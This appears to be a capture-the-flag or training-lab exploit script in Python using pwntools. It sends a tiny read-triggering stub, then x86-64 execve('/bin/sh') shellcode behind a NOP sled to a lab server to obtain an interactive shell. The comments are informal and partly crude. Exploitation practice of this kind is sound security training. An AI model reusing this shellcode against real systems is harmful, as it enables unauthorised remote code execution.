# So, we only have to work with 3 bytes, and yoooo, two of them are already taken by
# the syscall (\x0f\x05) , so, we take a look at the registers and value our options
# what is that we can do with only one byte ?
from pwn import *
site = "training.jinblack.it"
port = 2004
r = remote (site, port)

CODE_='''
      pop rdx
      syscall
      '''

shellcode= asm(CODE_, arch="amd64")

payload= shellcode


input("Press key to initiate the new SYS_read: ")
r.send(payload)

#1: rcx contains the address of the base of the allocated code,we'll use it to write a shellcode
#2: willem dripfoe is moving /bing/us/sh into the rbx, please remember that it wants a ptr to it !!
#3: we're moving the rsp back to the base of our code, big dick strat !
#4: now we're movin it up 0x100, we should crossover the nop sled
#5: we push our "/bin/sh\x00" into the stack, please notice the ENDIANESS
#6: Bing chillin' the ptr to the bin/sh string, one step close to the syscall that I'm boutta break
#7: We create a beautiful null via XORING
#8: We push it to the stack, we have a pointer ladies n gents!
#9 & 10:  We set the null ptr registers
#11: We set the code for the execve
#12: et voilà!
CODE_='''
        mov r14,rcx
        mov rbx, 0x0068732f6e69622f
        mov rsp,r14
        add rsp,0x100
        push rbx
        mov rdi,rsp
        xor rbx,rbx
        push rbx
        mov rsi,rsp
        mov rdx,rsp
        mov rax,0x3b
        syscall
      '''
shellcode = asm(CODE_, arch="amd64")
payload = b"\x90"*3+shellcode + b"\x90"*1000

input("Press key to inject stage two: ")
r.send(payload)
r.interactive()
#from this point on the connection opens a shell for stdin/stdout
